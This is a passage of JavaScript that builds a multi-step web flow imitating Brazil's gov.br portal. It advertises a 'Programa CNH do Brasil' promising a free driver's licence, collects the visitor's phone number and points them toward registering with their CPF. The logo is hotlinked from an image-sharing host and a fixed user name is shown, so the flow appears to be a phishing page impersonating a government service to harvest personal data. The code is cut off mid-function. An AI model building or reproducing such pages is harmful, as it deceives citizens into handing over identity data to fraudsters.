        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '7';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'QUAL É O SEU TELEFONE?';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Campo de telefone
        const phoneContainer = document.createElement('div');
        phoneContainer.className = 'pl-4';
        
        const phoneInput = document.createElement('input');
        phoneInput.type = 'tel';
        phoneInput.id = 'phone-input';
        phoneInput.placeholder = 'Digite seu telefone com DDD (ex: 11 98765-4321)';
        phoneInput.style.cssText = 'width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 0.875rem; font-family: Rawline, system-ui, sans-serif; outline: none; transition: border-color 0.3s;';
        
        phoneInput.addEventListener('focus', () => {
            phoneInput.style.borderColor = 'rgb(19, 81, 180)';
        });
        
        phoneInput.addEventListener('blur', () => {
            phoneInput.style.borderColor = '#e5e7eb';
        });
        
        // Formatação automática do telefone
        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            
            if (value.length > 0) {
                if (value.length <= 2) {
                    value = value;
                } else if (value.length <= 7) {
                    value = value.slice(0, 2) + ' ' + value.slice(2);
                } else {
                    value = value.slice(0, 2) + ' ' + value.slice(2, 7) + '-' + value.slice(7);
                }
            }
            e.target.value = value;
        });
        
        phoneContainer.appendChild(phoneInput);
        questionContainer.appendChild(phoneContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (phone) {
                // Validação básica de telefone
                const phoneRegex = /^\d{2}\s\d{4,5}-\d{4}$/;
                if (!phoneRegex.test(phone)) {
                    alert('Por favor, digite um telefone válido com DDD.');
                    return;
                }
                
                // Estado de processando
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
                confirmBtn.disabled = true;
                
                // Armazenar telefone e prosseguir
                localStorage.setItem('userPhone', phone);
                
                setTimeout(() => {
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                    
                    setTimeout(() => {
                        this.navigateToScreen('program');
                    }, 500);
                }, 1500);
            } else {
                alert('Por favor, digite seu telefone.');
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showProgramInfoScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '1';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const programImage = document.createElement('img');
        programImage.src = 'img/programa.png';
        programImage.alt = 'Programa CNH do Brasil';
        programImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        programImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(programImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 2 - Acesso ao Aplicativo com transição suave
            this.transitionScreens(() => this.navigateToScreen('appAccess'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showAppAccessScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 2 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '2';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Acesso ao Aplicativo';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Acesso ao Aplicativo';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Após finalizar seu cadastro, você receberá acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenção da sua CNH de forma simples e prática.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 3 - Aulas Teóricas e Práticas com transição suave
            this.transitionScreens(() => this.navigateToScreen('classes'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showClassesScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
